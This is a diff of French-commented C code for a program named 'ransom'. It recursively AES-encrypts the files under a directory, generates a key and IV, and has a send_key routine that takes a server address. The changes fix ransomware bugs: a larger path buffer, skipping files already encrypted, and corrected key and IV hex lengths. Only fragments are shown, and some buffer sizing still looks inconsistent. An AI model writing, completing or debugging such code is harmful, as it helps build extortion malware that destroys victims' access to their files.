@@ -5,7 +5,6 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-
 void usage();
 
 int is_encrypted(char *file)
@@ -34,7 +33,7 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 		if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check si entry n'est pas . ou ..
 		{
 			// Génère le chemin du fichier/dossier à partir de entry
-			char path[100];
+			char path[256];
 			strcpy(path, name);
 			strcat(path, "/");
 			strcat(path, entry->d_name);
@@ -51,11 +50,19 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 				{
 					if (de_flag == 'e')
 					{
-						encrypt(key, iv, path);
+						// Chiffre si le fichier ne l'est pas déjà
+						if (is_encrypted(entry->d_name) == 0)
+						{
+							encrypt(key, iv, path);
+						}
 					}
 					else if (de_flag == 'd')
 					{
-						decrypt(key, iv, path);
+						// Déchiffre si le fichier est chiffré
+						if (is_encrypted(entry->d_name) == 1)
+						{
+							decrypt(key, iv, path);
+						}
 					}
 				}
 			}
@@ -70,8 +77,8 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	RAND_bytes(key, sizeKey);
 	RAND_bytes(iv, sizeIv);
 	// Conversion en hexadécimal
-	bytes_to_hexa(key, pKey, sizeKey / 2);
-	bytes_to_hexa(iv, pIv, sizeIv / 2);
+	bytes_to_hexa(key, pKey, sizeKey);
+	bytes_to_hexa(iv, pIv, sizeIv);
 }
 
 int send_key(char *pKey, char *pIv, char *serveraddress)
@@ -103,9 +110,9 @@ int main(int argc, char *argv[])
 	// Clé & IV au format binaire
 	unsigned char key[AES_256_KEY_SIZE];
 	unsigned char iv[AES_BLOCK_SIZE];
-	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
-	char pKey[AES_256_KEY_SIZE / 2];
-	char pIv[AES_BLOCK_SIZE / 2];
+	// Clé & IV au format hexadécimal
+	char pKey[AES_256_KEY_SIZE];
+	char pIv[AES_BLOCK_SIZE*2];
 
 	if (argc > 1)
 	{
@@ -131,11 +138,11 @@ int main(int argc, char *argv[])
 				printf("Correct syntax: ransom -d key iv path\n");
 				return 0;
 			}
-			
+
 			// Check la taille de la clé
-			if (strlen(argv[2]) == AES_256_KEY_SIZE)
+			if (strlen(argv[2]) == AES_256_KEY_SIZE*2)
 			{
-				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE);
+				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE*2);
 			}
 			else
 			{
@@ -144,9 +151,9 @@ int main(int argc, char *argv[])
 			}
 
 			// Check la taille du vecteur
-			if (strlen(argv[3]) == AES_BLOCK_SIZE)
+			if (strlen(argv[3]) == AES_BLOCK_SIZE*2)
 			{
-				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE);
+				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE*2);
 			}
 			else
 			{
